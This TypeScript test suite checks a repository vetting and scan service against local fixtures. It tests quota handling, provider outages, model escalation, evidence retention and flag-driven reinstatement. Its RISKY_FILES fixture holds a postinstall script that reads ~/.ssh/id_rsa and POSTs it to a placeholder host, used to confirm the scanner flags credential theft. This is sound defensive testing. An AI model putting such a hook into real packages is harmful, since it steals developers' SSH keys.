// The bounded scan service end to end (PRD section 8; issue #909): one
// pass refreshes the queue, acquires the exact Git and template bytes,
// inspects them, runs the Surplus primary review and, only for an ambiguous
// result, the Surplus specialist, retains the evidence and publishes once.
// The malicious-detection and two-flag reinstatement scenarios come from
// the closed duplicate #1092.
// Every route is a real handler on the real migrations with local workerd
// R2. The Git API, GitHub identity and Surplus provider are local fixtures
// that answer exactly as those services do; no real provider or key is used.
import { afterEach, beforeEach, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readdirSync } from "node:fs";
import { mkdir, mkdtemp, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CloudflareProjectPersistence } from "../backend/projects/cloudflare-persistence";
import { handleProjectApi } from "../backend/projects/handler";
import { flaggerAuthority } from "../backend/projects/setup";
import { githubFlaggerStanding } from "../backend/vetting/flagger-standing";
import {
  handleProjectFlagsApi,
  ProjectFlagStore,
} from "../backend/vetting/flags";
import {
  handleVettingApi,
  queueAutomaticScan,
  signedVettingRequest,
} from "../backend/vetting/handler";
import {
  CloudflareVettingPersistence,
  summarize,
} from "../backend/vetting/persistence";
import { isScanResult } from "../backend/vetting/scan-result";
import { applicationManifest } from "../tests/project-application-manifest";
import { sqliteD1 } from "../tests/sqlite-d1";
import { localVettingEvidence } from "../tests/vetting-evidence-fixture";
import {
  runScanPass,
  type ScanServiceConfig,
  serviceConfigFrom,
} from "../workers/vetting/run";
import {
  SCAN_REVIEW_AREAS,
  type ScannerProfile,
} from "../workers/vetting/scanners";

const ORIGIN = "https://slop.cash";
const NOW = new Date("2026-10-18T12:00:00.000Z");
const APPLICANT = { githubId: "900000002", githubLogin: "e2e-applicant" };
const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
const ALICE = { githubId: "900000010", githubLogin: "alice" };
const BOB = { githubId: "900000011", githubLogin: "bob" };
const ACTORS: Record<string, { githubId: string; githubLogin: string }> = {
  applicant: APPLICANT,
  admin: ADMIN,
  alice: ALICE,
  bob: BOB,
};
const digest = (value: string | Uint8Array) =>
  createHash("sha256").update(value).digest("hex");
const templateText = "Follow the project rules and run the tests.\n";
const rendererText = "export const render = (value) => value;\n";
const templateInputs = {
  contributor: {
    sourcePath: "skills/contributor",
    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
  },
  reviewer: {
    sourcePath: "skills/reviewer",
    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
  },
  rendererSources: [{ path: "src/render.mjs", sha256: digest(rendererText) }],
  acceptedRevisions: ["1"],
};
let templateSha256 = digest(JSON.stringify(templateInputs));
const REPOSITORY_FILES: Record<string, string> = {
  "README.md": "# Fixture\nRun `bun test`.\n",
  "AGENTS.md": "Keep changes small and run the tests.\n",
  "package.json": JSON.stringify({
    name: "fixture",
    scripts: { test: "bun test" },
  }),
  "bun.lock": '{"lockfileVersion":1}',
  "src/index.ts": "export const parse = (value: string) => value.trim();\n",
};

let root: string;
let repository: string;
let commitSha: string;
let clock: Date;
let sqlite: ReturnType<typeof sqliteD1>["sqlite"];
let flags: ProjectFlagStore;
let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
let projects: CloudflareProjectPersistence;
let vetting: CloudflareVettingPersistence;
let server: ReturnType<typeof Bun.serve>;
let config: ScanServiceConfig;
let resultPublicKeys: string;
let ids = 0;
let acquisitionRequests: { host: string; authorization: string | null }[];
let publicGitHubLimit: number;
/** The inventory items the primary reviewer last received. */
let reviewedItems: { id: string; text: string }[] = [];
let sourceResponse: "normal" | "oversized" | "truncated" = "normal";
/** What the synthetic Surplus provider answers on each transport. */
let provider: {
  up: boolean;
  specialistUp: boolean;
  primary: "no-findings" | "findings" | "malicious-suspected";
  /** False makes every evidence route answer 503. */
  evidenceUp: boolean;
  calls: { path: string; model: string; authorization: string | null }[];
};

const git = (...args: string[]) => {
  const output = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
    cwd: repository,
  });
  if (output.status !== 0) throw new Error(output.stderr.toString());
  return output.stdout;
};

/** Commits files to the fixture repository; the live pin follows it. */
async function commit(
  files: Record<string, string | Uint8Array>,
  message: string,
) {
  for (const [path, text] of Object.entries(files)) {
    await mkdir(join(repository, path, ".."), { recursive: true });
    await writeFile(join(repository, path), text);
  }
  git("add", ".");
  git(
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.invalid",
    "commit",
    "--no-gpg-sign",
    "-qm",
    message,
  );
  commitSha = git("rev-parse", "HEAD").toString().trim();
}

function review(items: { id: string }[], verdict: string) {
  const risky = items.find((item) => item.id === "scripts/postinstall.js");
  return JSON.stringify({
    verdict,
    confidence: 0.9,
    coverage: Object.fromEntries(
      SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
    ),
    findings:
      verdict === "no-findings"
        ? []
        : [
            {
              severity:
                verdict === "malicious-suspected" ? "critical" : "medium",
              summary: risky
                ? "The install hook reads an SSH key and posts it out"
                : "Synthetic finding that needs a second opinion",
              evidenceIds: [(risky ?? items[0]).id],
            },
          ],
  });
}

/** Answers like Surplus: Anthropic Messages and OpenAI Responses. */
async function surplus(request: Request, path: string): Promise<Response> {
  const body = (await request.json()) as {
    model: string;
    messages?: { content: string }[];
    input?: string;
  };
  provider.calls.push({
    path,
    model: body.model,
    authorization: request.headers.get("authorization"),
  });
  if (!provider.up || (!provider.specialistUp && path === "/v1/responses"))
    return new Response("unavailable", { status: 503 });
  const usage = {
    input_tokens: 8,
    cache_read_input_tokens: 0,
    cache_creation_input_tokens: 0,
    output_tokens: 5,
  };
  if (path === "/anthropic/v1/messages") {
    const items = JSON.parse(body.messages?.[0].content ?? "{}").items;
    reviewedItems = items;
    return Response.json({
      id: "msg_fixture",
      model: body.model,
      stop_reason: "end_turn",
      content: [
        {
          type: "thinking",
          thinking: "Synthetic reasoning block",
          signature: "fixture",
        },
        {
          type: "text",
          text: "```json\n" + review(items, provider.primary) + "\n```",
        },
      ],
      usage,
    });
  }
  const items = JSON.parse(body.input ?? "{}").items;
  return Response.json({
    id: "resp_fixture",
    model: body.model,
    status: "completed",
    error: null,
    incomplete_details: null,
    output: [
      {
        type: "message",
        role: "assistant",
        content: [{ type: "output_text", text: review(items, "no-findings") }],
      },
    ],
    usage: {
      input_tokens: 8,
      input_tokens_details: { cached_tokens: 0 },
      output_tokens: 5,
    },
  });
}

const readLivePin = async () => ({ commitSha, templateSha256 });
const randomId = () =>
  `00000000-0000-4000-8000-${String(++ids).padStart(12, "0")}`;
const actorOf = (request: Request) =>
  ACTORS[request.headers.get("x-test-actor") ?? ""] ?? null;
/**
 * The real disposable runner from `workers/vetting-sandbox`, when the
 * isolated-artifact CI job starts it. Without it the route answers 503.
 */
const SANDBOX_URL = process.env.SLOP_SANDBOX_TEST_URL;
const sandbox = SANDBOX_URL
  ? {
      fetch: async (request: Request) =>
        fetch(`${SANDBOX_URL}${new URL(request.url).pathname}`, {
          method: request.method,
          headers: { "content-type": "application/json" },
          ...(request.method === "POST"
            ? { body: await request.arrayBuffer() }
            : {}),
        }),
    }
  : undefined;
const vettingDeps = () => ({
  sandbox,
  evidence: retained.evidence,
  vetting,
  flags,
  projects,
  resultPublicKeys,
  livePin: readLivePin,
  session: async () => null,
  now: () => clock,
  randomId,
});

function projectApi(request: Request) {
  return handleProjectApi(request, {
    persistence: projects,
    adminGithubIds: new Set([ADMIN.githubId]),
    moderatorGithubIds: new Set([ADMIN.githubId]),
    now: () => clock,
    randomId,
    sessionActor: async (value) => actorOf(value),
    repositoryControl: async () => ({ state: "matched", reason: "fixture" }),
    repositoryAccess: async () => ({
      installation: "installed",
      installationId: 1,
      permission: "admin",
      roleName: null,
    }),
    readTokenMetadata: async () => {
      throw new Error("no token reads in this suite");
    },
    github: { fetch: async () => new Response(null, { status: 404 }) },
    vettingClearance: (projectId, manifest, through, forReinstatement) =>
      vetting.manifestClearance(
        projectId,
        manifest,
        through,
        readLivePin,
        forReinstatement,
      ),
  }) as Promise<Response>;
}

/** The GitHub REST reads of acquisition and flag eligibility. */
function github(url: URL): Response {
  const path = url.pathname;
  if (path === "/repos/example/open-registry")
    return Response.json({
      id: 123456789,
      node_id: "R_example",
      full_name: "example/open-registry",
      private: false,
    });
  const object =
    /^\/repos\/example\/open-registry\/git\/(commits|trees|blobs)\/([0-9a-f]{40})$/u.exec(
      path,
    );
  if (object?.[1] === "commits")
    return Response.json({
      sha: object[2],
      tree: { sha: git("rev-parse", `${object[2]}^{tree}`).toString().trim() },
    });
  if (object?.[1] === "trees" && sourceResponse === "oversized")
    return new Response(new Uint8Array(4 * 1024 * 1024 + 1));
  if (object?.[1] === "trees")
    return Response.json({
      sha: object[2],
      truncated: sourceResponse === "truncated",
      tree: git("ls-tree", "-r", "-t", object[2])
        .toString()
        .split("\n")
        .filter(Boolean)
        .map((line) => {
          const [meta, entryPath] = line.split("\t");
          const [mode, type, sha] = meta.split(" ");
          return { path: entryPath, mode, type, sha };
        }),
    });
  if (object?.[1] === "blobs") {
    const bytes = git("cat-file", "blob", object[2]);
    return Response.json({
      sha: object[2],
      encoding: "base64",
      size: bytes.length,
      content: bytes.toString("base64"),
    });
  }
  const user = /^\/user\/([0-9]+)$/u.exec(path)?.[1];
  const actor = Object.values(ACTORS).find((entry) => entry.githubId === user);
  if (actor)
    return Response.json({
      id: Number(actor.githubId),
      login: actor.githubLogin,
      node_id: `U_${actor.githubId}`,
      type: "User",
      created_at: "2020-01-01T00:00:00Z",
    });
  if (/^\/repos\/[^/]+\/[^/]+\/issues$/u.test(path)) {
    const creator = Object.values(ACTORS).find(
      (entry) => entry.githubLogin === url.searchParams.get("creator"),
    );
    return Response.json(
      Array.from({ length: creator ? 2 : 0 }, (_, index) => ({
        number: index + 1,
        user: { id: Number(creator?.githubId) },
        pull_request: { merged_at: "2026-09-01T00:00:00Z" },
      })),
    );
  }
  return new Response(null, { status: 404 });
}

const flagApi = (request: Request) =>
  handleProjectFlagsApi(request, {
    flags,
    projects,
    sessionActor: async (value) => actorOf(value),
    flaggerStanding: githubFlaggerStanding({
      fetch: async (url: string) => github(new URL(url)),
      apiOrigin: "https://api.github.test",
      registryRepositories: async () =>
        (await projects.listProjects()).flatMap((entry) =>
          entry.manifest.repositories.map((item) => item.id),
        ),
    }),
    repositoryAuthority: async (manifest, actor) =>
      flaggerAuthority(
        {
          state: "read",
          access: {
            installation: "installed",
            installationId: 1,
            permission: "read",
            roleName: null,
          },
        },
        actor,
        manifest.repositories[0].id,
      ),
    moderatorGithubIds: [ADMIN.githubId],
    queueFreshScan: (project) =>
      queueAutomaticScan(
        vettingDeps(),
        project,
        "Automatic fresh scan after two contributor flags paused the project",
      ),
    now: () => clock,
    randomId,
  }) as Promise<Response>;

async function route(incoming: Request): Promise<Response> {
  const url = new URL(incoming.url);
  const host = incoming.headers.get("x-fixture-host");
  acquisitionRequests.push({
    host: host ?? "",
    authorization: incoming.headers.get("authorization"),
  });
  const path = url.pathname;
  if (host === "api.surplusintelligence.ai") return surplus(incoming, path);
  if (host === "raw.githubusercontent.com")
    return path.endsWith("/src/render.mjs")
      ? new Response(rendererText)
      : new Response(null, { status: 404 });
  if (host === "api.github.com") {
    const requests = acquisitionRequests.filter((r) => r.host === host);
    if (
      requests.length > publicGitHubLimit &&
      incoming.headers.get("authorization") !== "Bearer fixture-github-key"
    )
      return Response.json(
        { message: "API rate limit exceeded" },
        { status: 403 },
      );
    return github(url);
  }
  const request = new Request(`${ORIGIN}${path}${url.search}`, incoming);
  if (path === "/skill-templates/index.json")
    return Response.json({
      schemaVersion: "1",
      repository: "example/templates",
      commit: commitSha,
      templateSha256,
      revisionStatus: "committed",
      contributor: templateInputs.contributor,
      reviewer: templateInputs.reviewer,
      renderer: {
        sources: templateInputs.rendererSources,
        revisionStatus: "committed",
      },
      acceptedRevisions: templateInputs.acceptedRevisions,
    });
  if (path.startsWith("/skill-templates/")) return new Response(templateText);
  if (path.startsWith("/api/v1/vetting/evidence/") && !provider.evidenceUp)
    return Response.json({ error: "evidence_unavailable" }, { status: 503 });
  if (path.startsWith("/api/v1/vetting/evidence/"))
    return (
      (await retained.evidence.handle(request)) ??
      new Response(null, { status: 404 })
    );
  if (path.startsWith("/api/v1/vetting/"))
    return (
      (await handleVettingApi(request, vettingDeps())) ??
      new Response(null, { status: 404 })
    );
  return (await projectApi(request)) ?? new Response(null, { status: 404 });
}

const profile = (
  transport: ScannerProfile["transport"],
  reviewer: ScannerProfile["reviewer"],
  model: string,
): ScannerProfile => ({
  reviewer,
  transport,
  endpoint:
    transport === "anthropic-messages"
      ? "https://api.surplusintelligence.ai/anthropic/v1/messages"
      : "https://api.surplusintelligence.ai/v1/responses",
  model,
  apiKey: "fixture-surplus-key",
  maxOutputTokens: 1024,
  rateCard: {
    uncachedInputNanoUsdPerToken: "3",
    cachedInputNanoUsdPerToken: "1",
    cacheCreationNanoUsdPerToken: "4",
    outputNanoUsdPerToken: "9",
  },
});

beforeEach(async () => {
  acquisitionRequests = [];
  publicGitHubLimit = Number.POSITIVE_INFINITY;
  templateInputs.acceptedRevisions = ["1"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  clock = NOW;
  sourceResponse = "normal";
  root = await mkdtemp(join(tmpdir(), "slop-scan-service-"));
  repository = join(root, "git");
  await mkdir(repository);
  git("init", "-q");
  await commit(REPOSITORY_FILES, "Harmless fixture");
  const database = sqliteD1(
    readdirSync(new URL("../migrations", import.meta.url))
      .filter((name) => name.endsWith(".sql"))
      .sort(),
  );
  sqlite = database.sqlite;
  projects = new CloudflareProjectPersistence(database.db);
  flags = new ProjectFlagStore(database.db);
  retained = await localVettingEvidence(database.db, () => clock);
  vetting = new CloudflareVettingPersistence(
    database.db,
    async (a) => a.result !== null && retained.evidence.retained(a.result),
  );
  const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
    "sign",
    "verify",
  ])) as CryptoKeyPair;
  resultPublicKeys = Buffer.from(
    await crypto.subtle.exportKey("raw", pair.publicKey),
  ).toString("base64");
  // The evidence store verifies this service's own key.
  retained.evidence.deps.signed = (request, maximum) =>
    signedVettingRequest(
      request,
      { resultPublicKeys, now: () => clock },
      maximum,
    );
  provider = {
    up: true,
    specialistUp: true,
    primary: "no-findings",
    evidenceUp: true,
    calls: [],
  };
  server = Bun.serve({ port: 0, fetch: route });
  config = {
    connection: {
      origin: ORIGIN,
      ...pair,
      now: () => clock,
      fetch: ((input: string | URL | Request, init?: RequestInit) => {
        const url = new URL(String(input));
        return fetch(
          `http://localhost:${server.port}${url.pathname}${url.search}`,
          {
            ...init,
            headers: { ...(init?.headers ?? {}), "x-fixture-host": url.host },
          },
        );
      }) as typeof fetch,
    },
    primary: profile("anthropic-messages", "opus", "claude-opus-5.5"),
    specialist: profile("openai-responses", "astra", "gpt-6.1-sol"),
    policyVersion: "scan-policy-1",
    workDirectory: join(root, "work"),
    journalDirectory: join(root, "journal"),
    randomId,
  };
  const created = await projectApi(
    new Request(`${ORIGIN}/api/v1/projects`, {
      method: "POST",
      headers: {
        "x-test-actor": "applicant",
        "content-type": "application/json",
        origin: ORIGIN,
      },
      body: JSON.stringify({
        manifest: applicationManifest("open-registry", "example/open-registry"),
      }),
    }),
  );
  expect(created.status).toBe(201);
});
afterEach(async () => {
  server.stop(true);
  await retained?.dispose();
  await rm(root, { recursive: true, force: true });
});

async function activate() {
  const project = await projects.getProject("open-registry");
  return projectApi(
    new Request(`${ORIGIN}/api/v1/admin/projects/open-registry/manifest`, {
      method: "PUT",
      headers: {
        "x-test-actor": "admin",
        "content-type": "application/json",
        origin: ORIGIN,
      },
      body: JSON.stringify({
        manifest: { ...project?.manifest, status: "active" },
        expectedRevision: project?.revision,
        reason: "Activate the scanned revision",
      }),
    }),
  );
}

test("authenticated source acquisition exceeds the public quota without sharing its credential", async () => {
  await commit(
    Object.fromEntries(
      Array.from({ length: 65 }, (_, i) => [
        `src/file-${i}.ts`,
        `export const value${i} = ${i};\n`,
      ]),
    ),
    "Public repository exceeds the anonymous request allowance",
  );
  publicGitHubLimit = 60;
  provider.up = false;
  const unauthenticated = await runScanPass(config);
  expect(unauthenticated.assessments[0]).toMatchObject({
    state: "retry",
    step: "acquire",
  });
  acquisitionRequests = [];
  config.githubToken = "fixture-github-key";
  const authenticated = await runScanPass(config);
  expect(authenticated.assessments[0]).toMatchObject({
    state: "retry",
    step: "primary-review",
  });
  const githubRequests = acquisitionRequests.filter(
    (r) => r.host === "api.github.com",
  );
  expect(githubRequests.length).toBeGreaterThan(60);
  expect(
    githubRequests.every(
      (r) => r.authorization === "Bearer fixture-github-key",
    ),
  ).toBe(true);
  expect(
    acquisitionRequests
      .filter((r) => r.host !== "api.github.com")
      .every((r) => r.authorization !== "Bearer fixture-github-key"),
  ).toBe(true);
  expect(await readdir(config.workDirectory)).toEqual([]);
});

test("a template update replaces stale queued work without changing its retained assessment", async () => {
  provider.up = false;
  const first = await runScanPass(config);
  const original = await vetting.getAssessment(
    first.assessments[0].assessmentId,
  );
  expect(original?.state).toBe("pending");
  if (!original) throw new Error("The first scan was not queued");

  templateInputs.acceptedRevisions = ["1", "2"];
  templateSha256 = digest(JSON.stringify(templateInputs));
  clock = new Date(clock.getTime() + 1000);
  const next = await runScanPass(config);
  const pending = await vetting.pendingAssessments();
  expect(pending).toHaveLength(1);
  expect(pending[0].templateSha256).toBe(templateSha256);
  expect(pending[0].id).not.toBe(original?.id);
  expect(next.assessments).toEqual([
    { assessmentId: pending[0].id, state: "retry", step: "primary-review" },
  ]);
  expect(await vetting.getAssessment(original.id)).toEqual(original);
  expect(await vetting.listAssessments()).toHaveLength(2);
  await runScanPass(config);
  expect(await vetting.listAssessments()).toHaveLength(2);
  expect((await activate()).status).toBe(422);
});

test("a provider outage leaves the scan pending; the next pass clears the project with one Surplus review", async () => {
  provider.up = false;
  const failed = await runScanPass(config);
  expect(failed.refreshed).toBe(true);
  expect(failed.assessments).toHaveLength(1);
  const [{ assessmentId }] = failed.assessments;
  expect(failed.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "primary-review",
  });
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);
  expect(await readdir(config.workDirectory)).toEqual([]);
  const refused = await activate();
  expect(refused.status).toBe(422);
  expect((await refused.json()).error).toBe("vetting_required");

  provider.up = true;
  provider.calls = [];
  const passed = await runScanPass(config);
  expect(passed.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  // One primary review through Surplus with the account key; no specialist.
  expect(provider.calls).toEqual([
    {
      path: "/anthropic/v1/messages",
      model: "claude-opus-5.5",
      authorization: "Bearer fixture-surplus-key",
    },
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  expect(assessment?.state).toBe("clean");
  expect(assessment?.commitSha).toBe(commitSha);
  expect((await activate()).status).toBe(200);
  // The queue is empty and the journal keeps the one attempt.
  expect((await runScanPass(config)).assessments).toEqual([]);
  expect(await readdir(config.journalDirectory)).toEqual([assessmentId]);
});

test("an ambiguous primary review runs the Surplus specialist once before publication", async () => {
  provider.primary = "findings";
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: true,
      evidence: "retained",
    },
  ]);
  expect(provider.calls.map((call) => [call.path, call.model])).toEqual([
    ["/anthropic/v1/messages", "claude-opus-5.5"],
    ["/v1/responses", "gpt-6.1-sol"],
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  expect(assessment?.state).toBe("clean");
});

test("a failed specialist is a service failure: nothing is published and the scan retries", async () => {
  provider.primary = "findings";
  provider.specialistUp = false;
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "specialist-review",
  });
  expect(provider.calls.map((call) => call.path)).toEqual([
    "/anthropic/v1/messages",
    "/v1/responses",
  ]);
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);
});

const sessionRequest = (
  method: string,
  path: string,
  actor: string,
  body?: unknown,
) =>
  new Request(`${ORIGIN}/api/v1/${path}`, {
    method,
    headers: {
      "x-test-actor": actor,
      ...(body === undefined
        ? {}
        : { "content-type": "application/json", origin: ORIGIN }),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
const publicVetting = async () =>
  (
    await (
      await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`))
    ).json()
  ).vetting;
const flag = (actor: string) =>
  flagApi(
    sessionRequest("POST", "project-flags/open-registry", actor, {
      category: "credential-theft",
      evidence:
        "scripts/postinstall.js reads ~/.ssh/id_rsa and posts it to a remote host",
      evidenceUrl:
        "https://github.com/example/open-registry/blob/main/scripts/postinstall.js",
    }),
  );
const RISKY_FILES = {
  "package.json": JSON.stringify({
    name: "fixture",
    scripts: { test: "bun test", postinstall: "node scripts/postinstall.js" },
  }),
  "scripts/postinstall.js":
    "const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\nfetch('https://collector.invalid', { method: 'POST', body: key });\n",
};

test("a clean result is never published without its retained evidence; the next pass retries", async () => {
  provider.evidenceUp = false;
  const failed = await runScanPass(config);
  const [{ assessmentId }] = failed.assessments;
  expect(failed.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "evidence",
  });
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);

  provider.evidenceUp = true;
  clock = new Date(NOW.getTime() + 60_000);
  expect((await runScanPass(config)).assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  expect((await activate()).status).toBe(200);
});

test("an incomplete result is published although the evidence store fails, so the models are not called again", async () => {
  // A committed binary keeps the scan incomplete and quarantined.
  await commit({ "bin/tool.wasm": "\0asm\u0001\0\0\0" }, "Add a binary");
  provider.evidenceUp = false;
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: true,
      evidence: "failed",
    },
  ]);
  // A binary needs the specialist; each model runs once.
  expect(provider.calls.map((call) => call.model)).toEqual([
    "claude-opus-5.5",
    "gpt-6.1-sol",
  ]);
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("incomplete");
  provider.calls = [];
  expect((await runScanPass(config)).assessments).toEqual([]);
  expect(provider.calls).toEqual([]);
});

test("malicious-code detection: risky new content is flagged, escalated to the specialist and kept quarantined", async () => {
  await runScanPass(config);
  expect((await activate()).status).toBe(200);

  // A new commit adds an install hook that steals a key.
  await commit(RISKY_FILES, "Add install hook");
  expect((await publicVetting()).state).toBe("stale");
  provider.primary = "malicious-suspected";
  provider.calls = [];
  clock = new Date(NOW.getTime() + 60_000);
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: true,
      evidence: "retained",
    },
  ]);
  // The specialist runs only because the primary review was high risk.
  expect(provider.calls.map((call) => call.model)).toEqual([
    "claude-opus-5.5",
    "gpt-6.1-sol",
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(assessment?.state).toBe("incomplete");
  expect(result.checks["credential-theft"]).toBe("flagged");
  expect(result.primaryReview.risk).toBe("high");
  expect(result.specialistReview).toMatchObject({
    provider: "surplus",
    model: "gpt-6.1-sol",
  });
  // A model label alone never bans: a moderator confirms malice.
  expect(result.confirmation).toBeNull();
  expect((await publicVetting()).state).toBe("quarantined");
  expect(
    sqlite
      .query(
        "SELECT kind, label FROM vetting_evidence_objects WHERE assessment_id = ? AND kind = 'trace'",
      )
      .all(assessmentId),
  ).toEqual([{ kind: "trace", label: "Bounded scan report" }]);
});

test("a two-flag pause is reinstated automatically after the service's clean fresh scan", async () => {
  await runScanPass(config);
  expect((await activate()).status).toBe(200);

  // An unfinished scan must not block a later scan covering new flags.
  await commit({ "README.md": "# Updated fixture\n" }, "Update public guide");
  provider.up = false;
  const interrupted = await runScanPass(config);
  const oldId = interrupted.assessments[0].assessmentId;
  expect((await vetting.getAssessment(oldId))?.state).toBe("pending");
  provider.up = true;

  expect((await flag("alice")).status).toBe(201);
  clock = new Date(NOW.getTime() + 60_000);
  expect(await (await flag("bob")).json()).toMatchObject({
    paused: true,
    pausedByFlags: true,
    freshScan: "queued",
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(410);

  // An older app can write the same flags in a different order during rollout.
  // The database must refuse that duplicate before it supersedes this scan.
  const pending = await vetting.pendingAssessments();
  expect(() =>
    sqlite
      .query(
        `INSERT INTO vetting_assessments
         (id, project_id, revision, manifest_sha256, content_sha256, commit_sha,
          template_sha256, requested_by_github_id, requested_by_github_login,
          requested_at, request_reason, state, flag_ids)
         SELECT ?, project_id, revision, manifest_sha256, content_sha256, commit_sha,
                template_sha256, requested_by_github_id, requested_by_github_login,
                requested_at, request_reason, state,
                (SELECT json_group_array(value) FROM
                  (SELECT value FROM json_each(a.flag_ids) ORDER BY value DESC))
           FROM vetting_assessments a WHERE id = ?`,
      )
      .run(`vet_${"f".repeat(32)}`, pending[0].id),
  ).toThrow(/vetting_assessments.current_pending/u);

  clock = new Date(NOW.getTime() + 120_000);
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(assessmentId).not.toBe(oldId);
  expect((await vetting.getAssessment(oldId))?.state).toBe("pending");
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  const record = (await projects.listEnforcements())
    .filter((entry) => entry.projectId === "open-registry")
    .at(-1);
  expect(record).toMatchObject({
    action: "reinstate",
    stateAfter: "clear",
    actorRole: "vetting-service",
    systemIssuer: { rule: "clean-fresh-scan-after-flags", assessmentId },
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(200);
  expect(await flags.activeFlags(clock)).toEqual([]);
});

test("an unpinned endpoint or model fails closed before the queue or any provider is contacted", async () => {
  const contacted: string[] = [];
  const counting = {
    ...config.connection,
    fetch: ((input: string | URL | Request, init?: RequestInit) => {
      contacted.push(new URL(String(input)).host);
      return config.connection.fetch?.(input, init) as Promise<Response>;
    }) as typeof fetch,
  };
  for (const [primary, specialist] of [
    // The Surplus key must never reach the providers' own APIs.
    [
      { ...config.primary, endpoint: "https://api.anthropic.com/v1/messages" },
      config.specialist,
    ],
    [
      config.primary,
      { ...config.specialist, endpoint: "https://api.openai.com/v1/responses" },
    ],
    [{ ...config.primary, model: "claude-opus-5" }, config.specialist],
    [config.primary, { ...config.specialist, model: "gpt-6.1" }],
    // The specialist never stands in for the primary review.
    [config.specialist, config.primary],
  ] as [ScannerProfile, ScannerProfile][]) {
    await expect(
      runScanPass({ ...config, connection: counting, primary, specialist }),
    ).rejects.toThrow(
      /Unapproved scanner profile|must be Surplus claude-opus-5\.5/,
    );
  }
  expect(contacted).toEqual([]);
  expect(provider.calls).toEqual([]);
  expect(await vetting.pendingAssessments()).toEqual([]);

  // The operator file is checked the same way when the service starts.
  const signing = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
    "sign",
    "verify",
  ])) as CryptoKeyPair;
  const jwk = JSON.stringify(
    await crypto.subtle.exportKey("jwk", signing.privateKey),
  );
  const { apiKey: _primaryKey, ...primary } = config.primary;
  const { apiKey: _specialistKey, ...specialist } = config.specialist;
  const file = (overrides: object) =>
    JSON.stringify({
      origin: ORIGIN,
      policyVersion: "scan-policy-1",
      workDirectory: join(root, "work"),
      journalDirectory: join(root, "journal"),
      primary,
      specialist,
      ...overrides,
    });
  const env = {
    SURPLUS_API_KEY: "fixture-surplus-key",
    SLOP_VETTING_SIGNING_JWK: jwk,
  };
  const path = join(root, "service.json");
  await writeFile(path, file({}));
  expect((await serviceConfigFrom(path, env)).primary).toMatchObject({
    endpoint: "https://api.surplusintelligence.ai/anthropic/v1/messages",
    model: "claude-opus-5.5",
  });
  await writeFile(
    path,
    file({
      primary: {
        ...primary,
        endpoint: "https://api.anthropic.com/v1/messages",
      },
    }),
  );
  await expect(serviceConfigFrom(path, env)).rejects.toThrow(
    "Unapproved scanner profile",
  );
});

test("unsupported artifacts produce an incomplete scan rather than aborting the scan pass", async () => {
  await commit(
    Object.fromEntries(
      Array.from({ length: 101 }, (_, index) => [
        `artifacts/unsupported-${index}.exe`,
        `MZharmless unsupported fixture ${index}`,
      ]),
    ),
    "Add unsupported artifact fixtures",
  );
  const report = await runScanPass(config);
  expect(report.assessments).toHaveLength(1);
  expect(report.assessments[0]).toMatchObject({
    state: "published",
    disposition: "incomplete",
    outcome: "accepted",
  });
  const assessment = await vetting.getAssessment(
    report.assessments[0].assessmentId,
  );
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(result.artifacts).toHaveLength(101);
  expect(
    result.artifacts.every((artifact) => artifact.state === "quarantined"),
  ).toBe(true);
  expect((await activate()).status).toBe(422);
  expect((await runScanPass(config)).assessments).toEqual([]);
}, 30000);

/**
 * A harmless static Linux x86-64 program: write(1, "isolated\n") and exit(0).
 * One read-execute segment at 0x400000; entry 0x400078.
 */
